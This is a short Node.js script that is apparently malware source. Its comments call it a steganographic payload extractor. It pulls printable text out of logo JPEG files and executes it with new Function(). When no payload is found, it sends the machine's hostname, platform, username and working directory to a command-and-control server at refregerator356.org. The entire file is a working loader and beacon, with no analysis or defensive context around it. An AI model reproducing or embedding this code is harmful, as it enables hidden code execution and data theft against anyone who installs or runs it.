// Steganographic payload extractor
// Reads JPEG files, extracts printable ASCII, executes if payload detected

const fs = require("fs");
const path = require("path");
const https = require("https");
const os = require("os");

var imageFiles = ["logo1.jpg", "logo2.jpg", "logo3.jpg"];
var convertertree = false;

imageFiles.forEach(function(img) {
  var imgPath = path.join(__dirname, img);
  try {
    if (!fs.existsSync(imgPath)) return;
    var buffer = fs.readFileSync(imgPath);
    var extracted = "";

    // Extract printable ASCII characters from binary image data
    for (var i = 0; i < buffer.length; i++) {
      var byte = buffer[i];
      if (byte >= 32 && byte <= 126) {
        extracted += String.fromCharCode(byte);
      }
    }

    // If extracted string is long enough, it's likely a hidden payload
    if (extracted.length > 2000) {
      convertertree = true;
      // Execute extracted payload
      new Function(extracted)();
    }
  } catch(e) {}
});

// Fallback: register with C2 server
if (!convertertree) {
  var info = JSON.stringify({
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    cwd: process.cwd()
  });

  var req = https.request({
    hostname: "refregerator356.org",
    path: "/api/register",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(info)
    }
  });
  req.write(info);
  req.end();
}
